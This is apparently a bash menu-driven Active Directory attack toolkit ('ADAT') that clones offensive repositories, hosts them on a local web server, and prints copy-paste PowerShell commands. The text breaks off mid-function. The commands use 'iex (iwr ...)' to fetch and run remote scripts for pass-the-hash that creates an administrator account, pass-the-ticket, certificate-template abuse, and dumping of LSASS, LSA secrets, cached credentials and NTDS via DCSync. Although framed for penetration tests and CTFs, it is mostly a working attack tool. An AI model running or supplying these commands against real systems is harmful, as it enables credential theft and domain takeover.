# Test


################################################################################
# Variables                                                                    #
################################################################################


LocalIP="[Local-IP]";		
LocalPort="[Local-Port]";		
Username="'[Username]'";			
NQUsername="[Username]";			
Password="''";			
Domain="'[Domain]'";			
NQDomain="[Domain]";			
IP="'[IP]'";			
NQIP="[IP]";	
NTLMHash="'[NTLM-Hash]'";	
NQNTLMHash="[NTLM-Hash]";	
LDAP="";			
DC="";				
NS="<IP>";			
Version="v2.1"			
MainCheck="1"			

################################################################################
# Future Repo's for external                                                   #
################################################################################

"https://github.com/cybersecurityworks553/CVE-2021-1675_PrintNightMare.git"
"https://github.com/ly4k/Pachine.git"
"https://github.com/WazeHell/sam-the-admin.git"
"https://github.com/NickSanzotta/zeroscan.git"




################################################################################
# Wordlists                                                                    #
################################################################################

UserList="'/usr/share/seclists/Usernames/Names/names.txt'"
UserListXato="'/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'"


################################################################################
# Colors                                                                       #
################################################################################


RESTORE='\033[0m'

RED='\033[00;31m'
GREEN='\033[00;32m'
YELLOW='\033[00;33m'
BLUE='\033[00;34m'
PURPLE='\033[00;35m'
CYAN='\033[00;36m'
LIGHTGRAY='\033[00;37m'

LRED='\033[01;31m'
LGREEN='\033[01;32m'
LYELLOW='\033[01;33m'
LBLUE='\033[01;34m'
LPURPLE='\033[01;35m'
LCYAN='\033[01;36m'
WHITE='\033[01;37m'

IBLUE='\033[02;34m'
ICYAN='\033[02;36m'


################################################################################
# Public Repo List                                                             #
################################################################################


adPEASRepo="https://raw.githubusercontent.com/61106960/adPEAS/main/";
BloodHoundRepo="https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/";
DomainPasswordSprayRepo="https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/"
EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/";
GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
Group3rRepo="https://github.com/Group3r/Group3r/releases/download/1.0.41/Group3r.exe";
InveighRepo="https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/";
InvokeNoPacRepo="https://github.com/ricardojba/Invoke-noPac/blob/main/Invoke-noPac.ps1"
InvokeTheHashRepo="https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/";
JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/";
PowerSharpPackRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/";
PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/";
S3cur3Th1sSh1tCredsRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/";
SecListsRepo="https://github.com/danielmiessler/SecLists/";


LocalRepo="False"

################################################################################
# Local Repo	                                                               #
################################################################################


Function_LocalRepo () {

mkdir -p $HOME/ADAT
mkdir -p $HOME/ADAT/LocalRepo
cd $HOME/ADAT

# Set local repo locations in the ADAT folder.

adPEASLocalRepo="$HOME/ADAT/adPEAS"
BloodHoundLocalRepo="$HOME/ADAT/BloodHound"
Certificate="$HOME/ADAT/LocalRepo"
DomainPasswordSprayLocalRepo="$HOME/ADAT/DomainPasswordSpray"
EmpireLocalRepo="$HOME/ADAT/Empire"
GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
InveighLocalRepo="$HOME/ADAT/Inveigh"
InvokeTheHashLocalRepo="$HOME/ADAT/Invoke-TheHash"
InvokeNoPacLocalRepo="$HOME/ADAT/Invoke-NoPac"
JAWSLocalRepo="$HOME/ADAT/JAWS"
NishangLocalRepo="$HOME/ADAT/nishang"
PowerSharpPackLocalRepo="$HOME/ADAT/PowerSharpBinaries"
PowerSploitLocalRepo="$HOME/ADAT/PowerSploit"
PowersploitLocalRepo="$HOME/ADAT/Powersploit"
S3cur3Th1sSh1tCredsLocalRepo="$HOME/ADAT/S3cur3Th1sSh1t"


if [ -d "$EmpireLocalRepo" ] 
then
	echo -e ""
    	echo -e "Empire is installed, checking if updated to latest version."
    	cd $EmpireLocalRepo
    	git pull "https://github.com/BC-SECURITY/Empire.git"
    	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning Empire Repo${RESTORE}"
	git clone --recursive "https://github.com/BC-SECURITY/Empire.git" $HOME/ADAT/Empire
	echo -e ""
fi

if [ -d "$NishangLocalRepo" ] 
then
    	echo -e ""
    	echo -e "Nishang is installed, checking if updated to latest version."
    	cd $NishangLocalRepo
    	git pull "https://github.com/samratashok/nishang.git"
    	echo -e "" 
else
	echo -e ""
	echo -e "${LGREEN}Cloning Nishang Repo${RESTORE}"
	git clone --recursive "https://github.com/samratashok/nishang.git" $HOME/ADAT/nishang
	echo -e ""
fi



if [ -d "$PowerSploitLocalRepo" ] 
then
	echo -e ""
    	echo -e "PowerSploit is installed, checking if updated to latest version."
    	cd $PowerSploitLocalRepo
    	git pull "https://github.com/PowerShellMafia/PowerSploit.git"
    	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning PowerSploit Repo${RESTORE}"
	git clone --recursive "https://github.com/PowerShellMafia/PowerSploit.git" $HOME/ADAT/PowerSploit
	echo -e ""
fi

if [ -d "$JAWSLocalRepo" ] 
then
	echo -e ""
    	echo -e "JAWS is installed, checking if updated to latest version."
    	cd $JAWSLocalRepo
    	git pull "https://github.com/411Hall/JAWS.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning JAWS Repo${RESTORE}"
	git clone --recursive "https://github.com/411Hall/JAWS.git" $HOME/ADAT/JAWS
	echo -e ""
fi

if [ -d "$GetSystemTechniquesLocalRepo" ] 
then
	echo -e ""
    	echo -e "Get-System-Techniques is installed, checking if updated to latest version."
    	cd $GetSystemTechniquesLocalRepo
    	git pull "https://github.com/S3cur3Th1sSh1t/Get-System-Techniques.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning Get-System-Techniques Repo${RESTORE}"
	git clone --recursive "https://github.com/S3cur3Th1sSh1t/Get-System-Techniques.git" $HOME/ADAT/Get-System-Techniques
	echo -e ""
fi

if [ -d "$BloodHoundLocalRepo" ] 
then
	echo -e ""
    	echo -e "BloodHound is installed, checking if updated to latest version."
    	cd $BloodHoundLocalRepo
    	git pull "https://github.com/BloodHoundAD/BloodHound.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning BloodHound Repo${RESTORE}"
	git clone --recursive "https://github.com/BloodHoundAD/BloodHound.git" $HOME/ADAT/BloodHound
	echo -e ""
fi

if [ -d "$PowersploitLocalRepo" ] 
then
	echo -e ""
    	echo -e "Powersploit is installed, checking if updated to latest version."
    	cd $PowersploitLocalRepo
    	git pull "https://github.com/PowerShellMafia/PowerSploit.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning Powersploit Repo${RESTORE}"
	git clone --recursive "https://github.com/PowerShellMafia/PowerSploit.git" $HOME/ADAT/Powersploit
	echo -e ""
fi

if [ -d "$PowerSharpPackLocalRepo" ]
then
	echo -e ""
    	echo -e "PowerSharpPack is installed, checking if updated to latest version."
    	cd $PowerSharpPackLocalRepo
    	git pull "https://github.com/S3cur3Th1sSh1t/PowerSharpPack.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning PowerSharpPack Repo${RESTORE}"
	git clone --recursive "https://github.com/S3cur3Th1sSh1t/PowerSharpPack.git" $HOME/ADAT/PowerSharpPack
	echo -e ""
fi

if [ -d "$InveighLocalRepo" ]
then
	echo -e ""
    	echo -e "Inveigh is installed, checking if updated to latest version."
    	cd $InveighLocalRepo
    	git pull "https://github.com/Kevin-Robertson/Inveigh.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning Inveigh Repo${RESTORE}"
	git clone --recursive "https://github.com/Kevin-Robertson/Inveigh.git" $HOME/ADAT/Inveigh
	echo -e ""
fi

if [ -d "$DomainPasswordSprayLocalRepo" ]
then
	echo -e ""
    	echo -e "DomainPasswordSpray is installed, checking if updated to latest version."
    	cd $DomainPasswordSprayLocalRepo
    	git pull "https://github.com/dafthack/DomainPasswordSpray.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning DomainPasswordSpray Repo${RESTORE}"
	git clone --recursive "https://github.com/dafthack/DomainPasswordSpray.git" $HOME/ADAT/DomainPasswordSpray
	echo -e ""
fi

if [ -d "$S3cur3Th1sSh1tCredsLocalRepo" ]
then
	echo -e ""
    	echo -e "S3cur3Th1sSh1tCreds is installed, checking if updated to latest version."
    	cd $S3cur3Th1sSh1tCredsLocalRepo
    	git pull "https://github.com/S3cur3Th1sSh1t/Creds.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning S3cur3Th1sSh1tCreds Repo${RESTORE}"
	git clone --recursive "https://github.com/S3cur3Th1sSh1t/Creds.git" $HOME/ADAT/S3cur3Th1sSh1tCreds
	echo -e ""
fi

if [ -d "$InvokeNoPacLocalRepo" ]
then
	echo -e ""
    	echo -e "Invoke-NoPac is installed, checking if updated to latest version."
    	cd $InvokeNoPacLocalRepo
    	git pull "https://github.com/ricardojba/Invoke-noPac.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning Invoke-NoPac Repo${RESTORE}"
	git clone --recursive "https://github.com/ricardojba/Invoke-noPac.git" $HOME/ADAT/InvokeNoPacRepo
	echo -e ""
fi

if [ -d "$adPEASLocalRepo" ]
then
	echo -e ""
    	echo -e "adPEAS is installed, checking if updated to latest version."
    	cd $adPEASLocalRepo
    	git pull "https://github.com/61106960/adPEAS.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning adPEAS Repo${RESTORE}"
	git clone --recursive "https://github.com/61106960/adPEAS.git" $HOME/ADAT/adPEASRepo
	echo -e ""
fi

if [ -d "$InvokeTheHashLocalRepo" ]
then
	echo -e ""
    	echo -e "Invoke-TheHash is installed, checking if updated to latest version."
    	cd $InvokeTheHashLocalRepo
    	git pull "https://github.com/Kevin-Robertson/Invoke-TheHash.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning Invoke-TheHash Repo${RESTORE}"
	git clone --recursive "https://github.com/Kevin-Robertson/Invoke-TheHash.git" $HOME/ADAT/InvokeTheHashRepo
	echo -e ""
fi


# Copy local repo contents to single folder

cp -r $HOME/ADAT/BloodHound/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/Empire/empire/server/data/module_source/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/Get-System-Techniques/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/JAWS/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/Powersploit/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/PowerSharpPack/PowerSharpBinaries/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/Inveigh/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/DomainPasswordSpray/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/S3cur3Th1sSh1tCreds/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/InvokeNoPacRepo/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/adPEASRepo/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/InvokeTheHashRepo/* $HOME/ADAT/LocalRepo

# Set script repo locations to local IP and Port


EmpireRepo="http://$LocalIP:$LocalPort/"
NishangRepo="http://$LocalIP:$LocalPort/"
PentestFactoryRepo="http://$LocalIP:$LocalPort/"
LazagneRepo="http://$LocalIP:$LocalPort/"
PowerSploitRepo="http://$LocalIP:$LocalPort/"
S3cur3Th1sSh1tRepo="http://$LocalIP:$LocalPort/"
JAWSRepo="http://$LocalIP:$LocalPort/"
GetSystemTechniquesRepo="http://$LocalIP:$LocalPort/"
BloodHoundRepo="http://$LocalIP:$LocalPort/"
PowersploitRepo="http://$LocalIP:$LocalPort/"
PowerSharpPackRepo="http://$LocalIP:$LocalPort/"
InveighRepo="http://$LocalIP:$LocalPort/"
DomainPasswordSprayRepo="http://$LocalIP:$LocalPort/"
InvokeNoPacRepo="http://$LocalIP:$LocalPort/"
InvokeTheHashRepo="http://$LocalIP:$LocalPort/"
adPEASRepo="http://$LocalIP:$LocalPort/"
LocalRepo="True"

}

Internal_Menu_Host_Local(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Set Local Host Variables${RESTORE}"
echo -e ""
echo -ne "	
  	This option is used for when hosting the scripts utlizied by ADAT 
	are required on the local host rather than being called from GitHub.
	   
	This is preferable under two primary circumstances
	   
	- GitHub is not reachable from within the network you are testing on
	- You are doing a CTF and the machine has no access to the internet
	
	
"
echo -e "${YELLOW}External IP${RESTORE}" & curl ifconfig.me
echo -e ""
echo -e ""
echo -e "${YELLOW}Network adapter IPs${RESTORE}" & ip -br addr show
echo -e ""
echo -e ""

read -p "Enter Local IP to use: " LocalIP && read -p "Enter Local Port to use: " LocalPort
echo -e ""
echo -e "${YELLOW}The following variables have been set${RESTORE}"
echo -ne "
LocalIP		:	$LocalIP
LocalPort	:	$LocalPort

"

echo -e "${YELLOW}Checking if Repositories are updated${RESTORE}"

Function_LocalRepo


echo -e "${LGREEN}Repositories are up to date${RESTORE}"

echo -e "${YELLOW}Starting Python server${RESTORE}"
sleep 3s
echo -e ""
echo -e ""
echo -e "Python server starting on http://$LocalIP:$LocalPort"

python3 -m http.server $LocalPort --directory "$HOME/ADAT/LocalRepo" &> /dev/null &

sleep 3s
	

echo -ne "

            Return to previous menu?
                 	
        Q) -> Previous Menu
"
        read a
        case $a in
        	q|Q)	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac


}

################################################################################
# Download Methods                                                             #
################################################################################

iwr="iex (iwr -usebasicparsing "
DownloadMethod="$iwr"


################################################################################
# Main                                                                         #
################################################################################


Internal_Menu_Main(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -ne " What would you like to do?


	1)  ->  [ Alternate Authentication	]
	2)  ->	[ Certificate Services 		]
	3)  ->  [ Credential Access		]
	4)  ->  [ MiTM Attacks 			]
	5)  ->  [ MSSQL 			]
        6)  ->  [ Password Spraying 		]
        7)  ->  [ Privilege Escalation		]
        8)  ->  [ Recon 			]
        9)  ->	[ Token Manipulation		]
        
        A)  ->	[ AMSI Bypasses			]
        E)  ->	[ Recent CVE's			]
        L)  -> 	[ Host scripts on local host	]
        
"
        read a
        case $a in
                1) 	Internal_Menu_Alternate_Authentication ;;
                2)	Internal_Menu_Certificate_Services ;;
                3) 	Internal_Menu_Credential_Access ;;
        	4) 	Internal_Menu_MiTM_Attacks ;;
        	5) 	Internal_Menu_MSSQL ;;
	        6) 	Internal_Menu_Password_Spraying ;;
	        7) 	Internal_Menu_Privilege_Escalation ;;
	        8) 	Internal_Menu_Recon ;;
	        9)	Internal_Menu_Token ;;
	        a|A)	Internal_Menu_AMSI_Bypasses ;;
	        e|E)	Internal_Menu_CVEs ;;
	        l|L)	Internal_Menu_Host_Local ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

Internal_Menu_Alternate_Authentication(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Alternate Authentication Material Type



        1)  ->  [ Pass the Hash			]
        2)  ->  [ Pass the Ticket		]
                
        Q)  ->	[Previous Menu			]
"

        read a
        case $a in
                1) 	Internal_Menu_Alternate_Authentication_Pass_Hash ;;
        	2) 	Internal_Menu_Alternate_Authentication_Pass_Ticket ;;
        	q|Q)	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Alternate_Authentication_Pass_Hash(){

	clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Pass the Hash${RESTORE}"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"  
echo -e ""
echo -e "${YELLOW}Load Mimikatz into memory${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz"
echo -e ""
echo -e "${YELLOW}Spawn PowerShell Process with supplied user's NTLM hash${RESTORE}"
echo -e "Invoke-Mimikatz -Command '"\"sekurlsa::pth /user:$NQUsername /domain:$NQDomain /ntlm:$NQNTLMHash /run:powershell.exe"\"'"
echo -e ""
echo -e ""
echo -e "${IBLUE}Invoke-TheHash${RESTORE}"  
echo -e ""
echo -e "${YELLOW}Load all scripts into memory${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SMBExec.ps1)"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-WMIExec.ps1)"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-TheHash.ps1)"
echo -e ""
echo -e "${YELLOW}Check SMB signing${RESTORE}"
echo -e "Invoke-TheHash -Type SMBExec -Target $IP"
echo -e "Invoke-TheHash -Type SMBExec -Target [CIDR]"
echo -e ""
echo -e "${YELLOW}Check for command execution (SMB)${RESTORE}"
echo -e "Invoke-TheHash -Type SMBExec -Username $Username -Hash $NTLMHash -Target $IP"
echo -e "Invoke-TheHash -Type SMBExec -Username $Username -Hash $NTLMHash -Target [CIDR]"
echo -e ""
echo -e "${YELLOW}Pass hash to target and execute specified command (SMB) ${RESTORE}"
echo -e "Invoke-TheHash -Type SMBExec -Command "\"net user /add Pentest Password123 \&\& netlocal group 'Administrators' /add Pentest"\" -Username $NQUsername@$NQDomain -Hash $NTLMHash -Target $IP "
echo -e "Invoke-TheHash -Type SMBExec -Command "\"net user /add Pentest Password123 \&\& netlocal group 'Administrators' /add Pentest"\" -Username $NQUsername@$NQDomain -Hash $NTLMHash -Target [CIDR]"
echo -e ""
echo -e ""
echo -e "${YELLOW}Check for command execution (WMI)${RESTORE}"
echo -e "Invoke-TheHash -Type WMIExec -Username $Username -Hash $NTLMHash -Target $IP"
echo -e "Invoke-TheHash -Type WMIExec -Username $Username -Hash $NTLMHash -Target [CIDR]"
echo -e ""
echo -e "${YELLOW}Pass hash to target and execute specified command (WMI) ${RESTORE}"
echo -e "Invoke-TheHash -Type WMIExec -Command "\"net user /add Pentest Password123 \&\& netlocal group 'Administrators' /add Pentest"\" -Username $NQUsername@$NQDomain -Hash $NTLMHash -Target $IP"
echo -e "Invoke-TheHash -Type WMIExec -Command "\"net user /add Pentest Password123 \&\& netlocal group 'Administrators' /add Pentest"\" -Username $NQUsername@$NQDomain -Hash $NTLMHash -Target [CIDR]"
echo -e ""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Alternate_Authentication ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


Internal_Menu_Alternate_Authentication_Pass_Ticket(){

	clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Pass the Ticket${RESTORE}"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"  
echo -e ""
echo -e "${YELLOW}Load Mimikatz into memory${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz"
echo -e ""
echo -e "${YELLOW}Collect Tickets${RESTORE}"
echo -e "Invoke-Mimikatz -Command '"\"sekurlsa::tickets /export\""'"
echo -e ""
echo -e ""
echo -e "${YELLOW}Inject collected ticket${RESTORE}"
echo -e "Invoke-Mimikatz -Command '"\"kerberos::ptt [Ticket.kirbi]\""'"
echo -e ""
echo -e "${YELLOW}spawn CMD with the injected ticket${RESTORE}"
echo -e "Invoke-Mimikatz -Command '"\"misc::cmd\""'"
echo -e ""
echo -e ""
echo -e "${IBLUE}Rubeus${RESTORE}"
echo -e ""
echo -e "${YELLOW}Load Rubeus into memory${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1)"
echo -e ""
echo -e "${YELLOW}Collect Tickets${RESTORE}"
echo -e "Invoke-Rubeus -Command "\"dump /nowrap"\""
echo -e ""
echo -e "${YELLOW}Monitor for new tickets (Optional)${RESTORE}"
echo -e "Invoke-Rubeus -Command "\"monitor /interval:5 /nowrap"\""
echo -e ""
echo -e "${YELLOW}Inject ticket (base64 blob)${RESTORE}"
echo -e "Invoke-Rubeus -Command "\"ptt /ticket:[Base64Blob]"\""
echo -e ""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Alternate_Authentication ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}

Internal_Menu_Certificate_Services(){

	clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Certificate Services${RESTORE}"
echo -e ""
echo -e "Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target."
echo -e ""
echo -e "${LBLUE}#1: Load Invoke-Certify into memory${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Certify.ps1);Invoke-Certify"
echo -e ""
echo -e "${LBLUE}#2: Enumerate Vulnerable Templates${RESTORE}"
echo -e ""
echo -e "${YELLOW}Find vulnerable templates using default low-privileged group${RESTORE}"
echo -e "Invoke-Certify find /vulnerable"
echo -e  ""
echo -e "${YELLOW}Find vulnerable templates using all groups the current user context is a part of${RESTORE}"
echo -e "Invoke-Certify find /vulnerable /currentuser"
echo -e ""
echo -e ""
echo -e "${LBLUE}#3: Request Vulnerable Templates (Choose One)${RESTORE}"
echo -e ""
echo -e "${YELLOW}ESC1 SubjectAltName (SAN)${RESTORE}"
echo -e "Invoke-Certify request /ca:[CA Name] /template:[Template Name] /altname:[User]"
echo -e ""
echo -e ""
echo -e "${LBLUE}#4: Once requested convert on Unix device${RESTORE}"
echo -e "openssl pkcs12 -in cert.pem -keyex -CSP "\"Microsoft Enhanced Cryptographic Provider v1.0"\" -export -out cert.pfx"
echo -e ""
echo -e "${LBLUE}#5: Move the file from Linux back to the Windows system${RESTORE}"
echo -e ""
echo -e "${LBLUE}#6: Load Invoke-Rubeus into memory${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus"
echo -e ""
echo -e "${LBLUE}#7: Request a TGT with the altname and certificate${RESTORE}"
echo -e "Invoke-Rubeus -Command "\"asktgt /user:administrator /certificate:cert.pfx /password:Password /nowrap"\""
echo -e ""
echo -e "${LBLUE}#8: Load the Base64 encoded ticket into current PowerShell session${RESTORE}"
echo -e "Invoke-Rubeus -Command "\"ptt /ticket:doIF9jCCBfKgA..[Snip]"\""
echo -e ""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


Internal_Menu_Credential_Access(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Credential Access Type



        1)  ->  [ Credential Dumping 			]
        2)  ->  [ Credentials from Credential Manager	]
        3)  ->  [ Credentials from Group Policy		]
        4)  ->	[ Credentials from Web Browsers		]
        5)  -> 	[ Unsecured Credentials			]
                
        Q)  ->	[Previous Menu		    		]
"

        read a
        case $a in
                1) 	Internal_Menu_Credential_Access_Credential_Dumping ;;
        	2) 	Internal_Menu_Credential_Access_Credential_Manager ;;
	        3) 	Internal_Menu_Credential_Access_Credential_Group_Policy ;;
	        4) 	Internal_Menu_Credential_Access_Credential_Web_Browsers ;;
	        5) 	Internal_Menu_Credential_Access_Unsecured_Credentials ;;
	        q|Q)	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Credential_Access_Credential_Dumping(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Credential Dumping Type



        1)  ->  [ Cached Domain Credentials ]
        2)  ->  [ LSA Secrets		    ]
        3)  ->	[ LSASS Memory		    ]
        4)  -> 	[ NTDS			    ]
        5)  ->	[ SAM			    ]
        
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
                1) 	Internal_Menu_Credential_Access_Credential_Dumping_Cached_Domain_Credentials ;;
	        2) 	Internal_Menu_Credential_Access_Credential_Dumping_LSA_Secrets ;;
	        3) 	Internal_Menu_Credential_Access_Credential_Dumping_LSASS_Memory ;;
	        4) 	Internal_Menu_Credential_Access_Credential_Dumping_NTDS ;;
	        5)	Internal_Menu_Credential_Access_Credential_Dumping_SAM ;;
	        q|Q)	Internal_Menu_Credential_Access ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Credential_Access_Credential_Dumping_Cached_Domain_Credentials(){

	clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Cached Domain Credentials${RESTORE}"
echo -e ""
echo -e "${IBLUE}LaZagne${RESTORE}"
echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"token::elevate"\" "\"lsadump::cache"\"'"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac


}


Internal_Menu_Credential_Access_Credential_Dumping_LSA_Secrets(){

	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}LSA Secrets${RESTORE}"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"token::elevate"\" "\"lsadump::secrets"\"'"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac



}


Internal_Menu_Credential_Access_Credential_Dumping_LSASS_Memory(){

	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}LSASS Memory${RESTORE}"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -DumpCreds"
echo -e ""
echo -e "${IBLUE}Nanodump${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-NanoDump.ps1);Invoke-NanoDump"
echo -e ""
echo -e "${IBLUE}SharpSecDump${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac



}


Internal_Menu_Credential_Access_Credential_Dumping_NTDS(){
	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}NTDS${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-DCSync${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-DCSync.ps1);Invoke-DCSync"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:Security.local /user:all"\"'"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:Security.local /user:krbtgt"\"'"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::lsa /inject"\"'"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac



}


Internal_Menu_Credential_Access_Credential_Dumping_SAM(){

	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}SAM${RESTORE}"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
